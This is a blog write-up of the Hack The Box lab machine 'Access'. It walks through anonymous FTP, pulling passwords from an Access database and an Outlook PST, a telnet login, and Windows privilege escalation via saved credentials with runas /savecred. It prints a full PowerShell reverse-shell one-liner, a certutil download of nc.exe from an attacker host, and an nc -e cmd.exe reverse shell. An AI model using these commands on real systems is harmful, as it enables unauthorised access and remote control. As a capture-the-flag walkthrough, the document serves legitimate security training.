---
layout: single
title: Access - Hack The Box
excerpt: This is the writeup for Access, a Windows machine involving some enumeration of an Access DB, an Outlook PST and a priv esc using Windows Credential Manager.
date: 2019-03-02
classes: wide
header:
  teaser: /assets/images/htb-writeup-access/access_logo.png
categories:
  - hackthebox
  - infosec
tags:
  - telnet
  - windows
  - access
  - outlook
  - credential manager
---

Access was a quick and fun box where we had to look for credentials in an Access database then use the credentials to decrypt a PST file. Kali Linux has some tools that let us read those two file types without having to spin up a Windows VM. The box creator was kind enough to open up telnet so once we got the low privilege user credentials from the mailbox file we could log on and find the administrator credentials in the Windows Credential Manager.

![](/assets/images/htb-writeup-access/access_logo.png)

## Quick summary

- There's an encrypted zip file on the FTP server along with a .mdb Access DB backup
- The password for the zip file is contained in the backup file
- The zip file contains a .PST file with another set of credentials in an email
- The credentials give access to Windows through the telnet service
- The Windows administrator credentials are stored in Windows Credentials Manager

### Tools/Blogs used

- mdbtools
- readpst

## Detailed steps

### Portscan

Not many ports open for a Windows box.

```
root@darkisland:~# nmap -F 10.10.10.98
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-30 18:24 EDT
Nmap scan report for access.htb (10.10.10.98)
Host is up (0.018s latency).
Not shown: 97 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http
```

#### FTP

The FTP site allows anonymous access and there's two interesting files we can download:
- `backup.mdb`
- `Access Control.zip`

```
root@darkisland:~/hackthebox/Machines/Access# ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> type binary
200 Type set to I.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
5652480 bytes received in 0.94 secs (5.7248 MB/s)
ftp> cd ..
250 CWD command successful.
ftp> cd Engineer
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get "Access Control.zip"
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
10870 bytes received in 0.05 secs (200.3631 kB/s)
```

### Finding a password in the Access database

We can use mdbtools to view the Access database file:

```
root@darkisland:~/hackthebox/Machines/Access# mdb-tables -1 backup.mdb | grep -i auth
auth_group_permissions
auth_message
auth_permission
auth_user
auth_user_groups
auth_user_user_permissions
auth_group
AUTHDEVICE
```

We can issue SQL queries with the `mdb-sql` tool and look for credentials in the `auth_user` table:

```
root@darkisland:~/hackthebox/Machines/Access# mdb-sql -p backup.mdb 
1 => select * from auth_user
2 => go

id	username	password	Status	last_login	RoleID	Remark
25	admin	admin	1	08/23/18 21:11:47	26	
27	engineer	access4u@security	1	08/23/18 21:13:36	26	
28	backup_admin	admin	1	08/23/18 21:14:02	26	
3 Rows retrieved
```

Found the following credentials:
 - `engineer` / `access4u@security`

### Finding credentials in PST file

Unzipping the encrypted zip file with password `access4u@security`:

```
root@darkisland:~/hackthebox/Machines/Access# 7z e access.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i7-2600K CPU @ 3.40GHz (206A7),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: access.zip
--
Path = access.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
Everything is Ok         

Size:       271360
Compressed: 10870
```

We can read the PST file content with `readpst` and it'll create an mbox file:

```
root@darkisland:~/hackthebox/Machines/Access# readpst access.pst
Opening PST file and indexes...
Processing Folder "Deleted Items"
	"Access Control" - 2 items done, 0 items skipped.

root@darkisland:~/hackthebox/Machines/Access# ls -l
total 5820
-rw-r--r-- 1 root root    3112 Sep 30 18:36 'Access Control.mbox'
```

Looking in the mbox file we find an email with another set of credentials:

```
root@darkisland:~/hackthebox/Machines/Access# cat 'Access Control.mbox'
From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
[...]
Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,

John
```

Found the following credentials:
 - `security` / `4Cc3ssC0ntr0ller`

### Getting a shell

Telnet is enabled on this box so we can use that last set of credentials and log in to the server:

```
root@darkisland:~/hackthebox/Machines/Access# telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 4Cc3ssC0ntr0ller

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>type desktop\user.txt
ff1f3b<redacted>
```

### Priv esc with Windows Credentials Manager

Our `security` user doesn't have any useful privileges or group memberships. That telnet shell was pretty slow and buggy. I tried running PowerShell but I wasn't getting any output from the shell so instead I just spawned a reverse shell with Nishang:

```
C:\Users\security>powershell -command "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.23',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.98] 49159

PS C:\Users\security> whoami
access\security
PS C:\Users\security>
```

```
PS C:\Users\security> vaultcmd /list
Currently loaded vaults:
	Vault: security's Vault
	Vault Guid:{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}
	Location: C:\Users\security\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
	Status: Unlocked
	Visibility: Not hidden

	Vault: Windows Vault
	Vault Guid:{77BC582B-F0A6-4E15-4E80-61736B6F3B29}
	Location: C:\Users\security\AppData\Local\Microsoft\Vault
	Status: Unlocked
	Visibility: Not hidden
```

Administrator credentials saved in security user's vault:

```
PS C:\Users\security> vaultcmd /listcreds:"Windows Vault"
Credentials in vault: Windows Vault

Credential schema: Windows Domain Password Credential
Resource: Domain:interactive=ACCESS\Administrator
Identity: ACCESS\Administrator
Property (schema element id,value): (100,3)
```

I tried using [https://github.com/peewpw/Invoke-WCMDump](Invoke-WCMDUmp) to retrieve the plaintext credentials but that tool only works for "Generic" type credentials.

So instead I just transferred netcat to the machine and popped a shell this way:

```
PS C:\Users\security> certutil -urlcache -f http://10.10.14.23/nc.exe nc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

```
echo c:\users\security\nc.exe -e cmd.exe 10.10.14.23 4444 > shell.bat
runas /user:administrator /savecred c:\users\security\shell.bat
```

```
root@darkisland:~/hackthebox/Machines/Access# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.98] 49159
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
access\administrator

C:\Windows\system32>type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
6e1586<redacted>
```
